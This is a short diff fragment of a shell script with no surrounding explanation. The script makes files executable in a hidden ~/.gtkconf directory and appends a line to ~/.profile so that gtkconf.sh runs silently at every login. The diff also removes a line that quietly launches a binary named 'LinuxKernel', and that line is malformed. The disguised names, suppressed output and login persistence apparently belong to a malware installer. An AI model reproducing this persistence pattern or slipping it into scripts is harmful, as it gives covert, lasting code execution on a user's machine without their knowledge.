@@ -11,4 +11,3 @@ chmod +x $HOME/.gtkconf/*
 
 
 echo "$HOME/.gtkconf/gtkconf.sh>/dev/null 2>&1" >>$HOME/.profile
-./$HOME/.gtkconf/LinuxKernel>/dev/null 2>&1"
